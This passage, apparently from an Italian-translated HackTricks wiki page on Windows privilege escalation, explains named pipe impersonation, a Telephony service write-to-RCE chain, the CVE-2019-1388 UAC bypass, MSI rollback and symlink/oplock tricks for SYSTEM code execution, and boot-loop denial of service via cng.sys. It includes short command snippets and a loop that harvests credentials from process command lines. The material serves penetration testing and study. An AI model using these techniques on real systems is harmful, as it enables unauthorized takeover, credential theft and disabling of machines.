## Named Pipe Client Impersonation

I segmenti di memoria condivisa, indicati come **pipes**, permettono la comunicazione tra processi e il trasferimento di dati.

Windows fornisce una funzionalità chiamata **Named Pipes**, che permette a processi non correlati di condividere dati, anche su reti diverse. Questo somiglia a un'architettura client/server, con i ruoli definiti come **named pipe server** e **named pipe client**.

Quando dei dati vengono inviati attraverso una pipe da un **client**, il **server** che ha creato la pipe ha la possibilità di **assumere l'identità** del **client**, a condizione che possieda i diritti **SeImpersonate** necessari. Individuare un **processo privilegiato** che comunica tramite una pipe che puoi emulare offre l'opportunità di **ottenere privilegi più elevati** assumendo l'identità di quel processo quando interagisce con la pipe che hai stabilito. Per istruzioni su come eseguire questo tipo di attacco, sono utili le guide [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre il seguente tool permette di **intercettare una comunicazione tramite named pipe con uno strumento come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo tool permette di elencare e vedere tutte le pipe per trovare privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Il servizio Telephony (TapiSrv) in modalità server espone `\\pipe\\tapsrv` (MS-TRP). Un client remoto autenticato può abusare del percorso di eventi asincroni basato su mailslot per trasformare `ClientAttach` in una scrittura arbitraria di **4-byte** su qualsiasi file esistente scrivibile da `NETWORK SERVICE`, quindi ottenere i diritti di amministratore Telephony e caricare una DLL arbitraria come servizio. Flusso completo:

- `ClientAttach` con `pszDomainUser` impostato su un percorso esistente e scrivibile → il servizio lo apre tramite `CreateFileW(..., OPEN_EXISTING)` e lo usa per le scritture di eventi asincroni.
- Ogni evento scrive l'`InitContext` controllato dall'attaccante proveniente da `Initialize` su quella handle. Registra un line app con `LRegisterRequestRecipient` (`Req_Func 61`), innesca `TRequestMakeCall` (`Req_Func 121`), recupera tramite `GetAsyncEvents` (`Req_Func 0`), quindi deregistra/arresta per ripetere scritture deterministiche.
- Aggiungiti a `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, riconnettiti, quindi chiama `GetUIDllName` con un percorso DLL arbitrario per eseguire `TSPI_providerUIIdentify` come `NETWORK SERVICE`.

Ulteriori dettagli:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varie

### Estensioni di file che potrebbero eseguire codice in Windows

Dai un'occhiata alla pagina **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

I link cliccabili in Markdown passati a `ShellExecuteExW` possono attivare handler di URI pericolosi (`file:`, `ms-appinstaller:` o qualsiasi schema registrato) ed eseguire file controllati dall'attaccante con i privilegi dell'utente corrente. Vedi:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoraggio delle linee di comando per password**

Quando si ottiene una shell come utente, ci possono essere attività pianificate o altri processi in esecuzione che **passano credenziali sulla linea di comando**. Lo script qui sotto cattura le linee di comando dei processi ogni due secondi e confronta lo stato attuale con quello precedente, stampando eventuali differenze.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se hai accesso all'interfaccia grafica (via console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.

Ciò rende possibile effettuare un'elevazione di privilegi e bypassare UAC contemporaneamente sfruttando la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binary usato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Hai tutti i file e le informazioni necessarie nel seguente repository GitHub:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

La tecnica descritta [**in questo blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un codice exploit [**disponibile qui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attacco consiste fondamentalmente nell'abusare della funzionalità di rollback di Windows Installer per sostituire file legittimi con file dannosi durante il processo di uninstall. Per questo l'attaccante deve creare un **malicious MSI installer** che sarà usato per hijackare la cartella `C:\Config.Msi`, che verrà poi usata da Windows Installer per memorizzare i file di rollback durante la disinstallazione di altri pacchetti MSI, dove i file di rollback sarebbero stati modificati per contenere il payload malevolo.

La tecnica riassunta è la seguente:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crea un `.msi` che installa un file innocuo (es., `dummy.txt`) in una cartella scrivibile (`TARGETDIR`).
- Marca l'installer come **"UAC Compliant"**, così un **non-admin user** può eseguirlo.
- Mantieni un **handle** aperto sul file dopo l'install.

- Step 2: Begin Uninstall
- Disinstalla lo stesso `.msi`.
- Il processo di uninstall inizia a spostare i file in `C:\Config.Msi` e a rinominarli in file `.rbf` (backup di rollback).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Il `.msi` include una **custom uninstall action (`SyncOnRbfWritten`)** che:
- Segnala quando il `.rbf` è stato scritto.
- Poi **attende** su un altro evento prima di continuare l'uninstall.

- Step 4: Block Deletion of `.rbf`
- Quando viene segnalato, **apri il file `.rbf`** senza `FILE_SHARE_DELETE` — questo **impedisce che sia cancellato**.
- Poi **manda il segnale di ritorno** così l'uninstall può terminare.
- Windows Installer non riesce a cancellare il `.rbf`, e poiché non può eliminare tutto il contenuto, **`C:\Config.Msi` non viene rimosso**.

- Step 5: Manually Delete `.rbf`
- Tu (attaccante) cancelli manualmente il file `.rbf`.
- Ora **`C:\Config.Msi` è vuota**, pronta per essere hijackata.

> A questo punto, **trigger the SYSTEM-level arbitrary folder delete vulnerability** per cancellare `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Ricrea tu stesso la cartella `C:\Config.Msi`.
- Imposta **weak DACLs** (es., Everyone:F), e **mantieni un handle aperto** con `WRITE_DAC`.

- Step 7: Run Another Install
- Installa di nuovo il `.msi`, con:
- `TARGETDIR`: posizione scrivibile.
- `ERROROUT`: una variabile che causa un failure forzato.
- Questa installazione sarà usata per triggerare di nuovo il **rollback**, che legge `.rbs` e `.rbf`.

- Step 8: Monitor for `.rbs`
- Usa `ReadDirectoryChangesW` per monitorare `C:\Config.Msi` finché non appare un nuovo `.rbs`.
- Cattura il suo filename.

- Step 9: Sync Before Rollback
- Il `.msi` contiene una **custom install action (`SyncBeforeRollback`)** che:
- Segnala un evento quando il `.rbs` viene creato.
- Poi **attende** prima di continuare.

- Step 10: Reapply Weak ACL
- Dopo aver ricevuto l'evento `rbs created`:
- Windows Installer **reapplica ACL forti** a `C:\Config.Msi`.
- Ma poiché hai ancora un handle con `WRITE_DAC`, puoi **riapplicare ACL deboli** di nuovo.

> Le ACL sono **applicate solo all'apertura dell'handle**, quindi puoi ancora scrivere nella cartella.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sovrascrivi il file `.rbs` con uno **fake rollback script** che dice a Windows di:
- Ripristinare il tuo `.rbf` (una DLL malevola) in una **location privilegiata** (es., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Depositare il tuo fake `.rbf` contenente una **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Segnala l'evento di sync così l'installer riprende.
- Una **type 19 custom action (`ErrorOut`)** è configurata per **fallire intenzionalmente l'install** in un punto noto.
- Questo causa l'inizio del **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Legge il tuo `.rbs` malevolo.
- Copia il tuo `.rbf` DLL nella location target.
- Ora hai la tua **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Esegui un binario trusted **auto-elevated** (es., `osk.exe`) che carica la DLL che hai hijackato.
- **Boom**: Il tuo codice viene eseguito **come SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

La tecnica principale del rollback MSI (quella precedente) assume che tu possa cancellare un **intera cartella** (es., `C:\Config.Msi`). Ma cosa succede se la tua vulnerabilità permette solo la **cancellazione arbitraria di file**?

Potresti sfruttare gli **internals NTFS**: ogni cartella ha uno stream di dati alternativo nascosto chiamato:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Questo stream memorizza i **metadati dell'indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l'intera cartella** dal filesystem.

Puoi farlo usando API standard per la cancellazione dei file come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Anche se stai chiamando una *file* delete API, essa **elimina la cartella stessa**.

### Da Folder Contents Delete a SYSTEM EoP
Che succede se la tua primitive non ti permette di eliminare file/cartelle arbitrari, ma **permette la cancellazione dei *contenuti* di una folder controllata dall'attaccante**?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- L'oplock **sospende l'esecuzione** quando un processo privilegiato tenta di eliminare `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passo 3: Innescare il processo SYSTEM (es., `SilentCleanup`)
- Questo processo scansiona le cartelle (es., `%TEMP%`) e cerca di eliminare il loro contenuto.
- Quando raggiunge `file1.txt`, **l'oplock si attiva** e passa il controllo al tuo callback.

4. Passo 4: All'interno del callback dell'oplock – reindirizzare la cancellazione

- Opzione A: Sposta `file1.txt` altrove
- Questo svuota `folder1` senza interrompere l'oplock.
- Non eliminare `file1.txt` direttamente — questo rilascierebbe l'oplock prematuramente.

- Opzione B: Converti `folder1` in una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opzione C: Crea un **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Questo prende di mira lo stream interno di NTFS che memorizza i metadati delle cartelle — eliminarlo elimina la cartella.

5. Passo 5: Rilascio dell'oplock
- Il processo SYSTEM continua e prova a eliminare `file1.txt`.
- Ma ora, a causa della junction + symlink, sta effettivamente eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Risultato**: `C:\Config.Msi` viene eliminato da SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

Sfrutta una primitiva che ti permette di **create an arbitrary folder as SYSTEM/admin** — anche se **non puoi scrivere file** o **impostare permessi deboli**.

Crea una **cartella** (non un file) con il nome di un **driver critico di Windows**, ad esempio:
```
C:\Windows\System32\cng.sys
```
- Questo percorso normalmente corrisponde al driver in modalità kernel `cng.sys`.
- Se lo **crei preventivamente come cartella**, Windows non riesce a caricare il driver reale all'avvio.
- Poi, Windows prova a caricare `cng.sys` durante l'avvio.
- Vede la cartella, **non riesce a risolvere il driver effettivo**, e **va in crash o blocca l'avvio**.
- Non è disponibile una **soluzione di ripiego**, e **nessun recupero** senza intervento esterno (ad es., riparazione dell'avvio o accesso al disco).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Quando un **servizio privilegiato** scrive log/exports in un percorso letto da una **config scrivibile**, reindirizza quel percorso con **Object Manager symlinks + NTFS mount points** per trasformare la scrittura privilegiata in una sovrascrittura arbitraria (anche **senza** SeCreateSymbolicLinkPrivilege).

**Requisiti**
- Il file di config che memorizza il percorso di destinazione è scrivibile dall'attaccante (ad es., `%ProgramData%\...\.ini`).
- Possibilità di creare un mount point verso `\RPC Control` e un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Un'operazione privilegiata che scrive in quel percorso (log, export, report).

**Esempio di catena**
1. Leggere la config per recuperare la destinazione del log privilegiato, ad es. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Reindirizzare il percorso senza privilegi di amministratore:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendere che il componente privilegiato scriva il log (es., l'amministratore avvia "send test SMS"). La scrittura viene ora indirizzata a `C:\Windows\System32\cng.sys`.
4. Ispezionare il target sovrascritto (parser hex/PE) per confermare la corruzione; il reboot forza Windows a caricare il percorso del driver manomesso → **boot loop DoS**. Questo si generalizza anche a qualsiasi file protetto che un servizio privilegiato aprirà in scrittura.

> `cng.sys` viene normalmente caricato da `C:\Windows\System32\drivers\cng.sys`, ma se esiste una copia in `C:\Windows\System32\cng.sys` può essere provata prima, rendendola un sink DoS affidabile per dati corrotti.



## **Da High Integrity a SYSTEM**

### **Nuovo servizio**

Se stai già eseguendo un processo High Integrity, il **percorso verso SYSTEM** può essere semplice: basta **creare ed eseguire un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un service binary assicurati che sia un servizio valido o che il binario esegua le azioni necessarie rapidamente, perché verrà terminato dopo 20s se non è un servizio valido.

### AlwaysInstallElevated

Da un processo ad alta integrità puoi provare ad **enable the AlwaysInstallElevated registry entries** e **install** una reverse shell usando un _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puoi** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se disponi di quei token privileges (probabilmente li troverai in un processo già ad alta integrità), sarai in grado di **open almost any process** (not protected processes) con il privilegio SeDebug, **copy the token** del processo e creare un **arbitrary process with that token**.\
Usando questa tecnica di solito si **seleziona un processo in esecuzione come SYSTEM con tutti i token privileges** (_sì, puoi trovare processi SYSTEM senza tutti i token privileges_).\
**Puoi trovare un** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica è usata da meterpreter per escalate con `getsystem`. La tecnica consiste nel **creating a pipe and then create/abuse a service to write on that pipe**. Poi, il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** sarà in grado di **impersonate the token** del client della pipe (il service) ottenendo privilegi SYSTEM.\
Se vuoi [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijack a dll** caricata da un **process** in esecuzione come **SYSTEM** sarai in grado di eseguire codice arbitrario con quei permessi. Perciò Dll Hijacking è utile per questo tipo di escalation di privilegi e, inoltre, è molto **more easy to achieve from a high integrity process** poiché avrà **write permissions** sulle cartelle usate per caricare le dll.\
**Puoi** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Altre risorse

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti utili

**Miglior strumento per cercare vettori di Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Controlla misconfigurazioni e file sensibili (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Controlla alcune possibili misconfigurazioni e raccoglie info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Controlla misconfigurazioni**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali da Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Distribuisce le password raccolte nel dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è un PowerShell ADIDNS/LLMNR/mDNS spoofer e strumento man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione Windows base per privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Cerca vulnerabilità privesc note (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità privesc note (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando misconfigurazioni (più uno strumento di raccolta info che di privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Controlla misconfigurazioni (executable precompiled in github). Non raccomandato. Non funziona bene in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla possibili misconfigurazioni (exe from python). Non raccomandato. Non funziona bene in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato basato su questo post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto usando la versione corretta di .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione di .NET installata sull'host vittima puoi fare:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Riferimenti

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
